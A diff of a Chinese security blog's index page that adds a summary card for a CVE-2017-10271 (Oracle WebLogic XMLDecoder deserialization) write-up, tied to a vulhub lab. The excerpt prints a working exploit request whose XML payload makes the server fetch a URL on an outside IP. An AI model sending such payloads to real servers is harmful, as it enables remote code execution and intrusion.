@@ -83,6 +83,64 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/cve-2017-10271/">CVE-2017-10271</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2018-03-09</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">代码执行</a>&nbsp;&#47;
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 CVE-2017-10271 CVE-2017-10271是利用Oracle WebLogic中WLS 组件的反序列化漏洞进行远程代码执行的
+漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
+0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object id=&quot;url&quot; class=&quot;java.net.URL&quot;&gt; &lt;string&gt;http://114.115.123.123:80/aaaaaaa&lt;/string&gt; &lt;/object&gt; &lt;object idref=&quot;url&quot;&gt; &lt;void id=&quot;stream&quot; method = &quot;openStream&quot; /&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/cve-2017-10271/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+                
+                    
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/struts2-046/">Struts2 046</a></h2>
 
         
@@ -273,7 +331,7 @@ array( //这个是字符串形式的数组，它并不是数组，而是字符�
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(13)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(66)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(67)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(12)</a></li>
         
@@ -497,7 +555,7 @@ array( //这个是字符串形式的数组，它并不是数组，而是字符�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
-                <sup>3</sup>
+                <sup>4</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -517,7 +575,7 @@ array( //这个是字符串形式的数组，它并不是数组，而是字符�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
-                <sup>1</sup>
+                <sup>2</sup>
             </p>
         
             <p style="display:inline-block;">
